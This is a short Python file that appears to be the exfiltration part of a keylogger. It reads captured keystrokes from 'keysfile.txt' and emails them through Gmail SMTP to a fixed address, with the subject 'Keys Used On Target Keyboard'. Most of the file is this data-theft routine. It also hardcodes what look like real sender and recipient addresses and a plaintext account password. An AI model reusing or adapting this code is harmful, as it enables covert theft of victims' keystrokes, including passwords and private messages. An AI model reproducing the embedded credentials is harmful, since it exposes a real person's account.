import smtplib
from email.header import Header
from email.mime.text import MIMEText
from getpass import getpass



def send_email():
    from_id = "praneethchandrathota@gmail.com"
    to_id = "praneethchandra.chandra98@gmail.com"
    password = "tpchandra@213"

    #print("opening the file")

    '''
    with open("keysfile.txt") as kf:
        msg = EmailMessage()
        msg.set_content(kf.read())
    '''

    with open("keysfile.txt") as kf:
        data = kf.read()
    kf.close

    #print("contents are copied")

    msg = MIMEText(data)
    msg['Subject'] = Header("Keys Used On Target Keyboard")
    msg['From'] = from_id
    msg['To'] = to_id


    #print("establishing conection")
    s = smtplib.SMTP_SSL("smtp.gmail.com", 465)#ports 465 and 587 are used for email
    s.login(from_id, password)
    s.sendmail(from_id, to_id, str(msg))
    #print("message sent")
    s.quit()
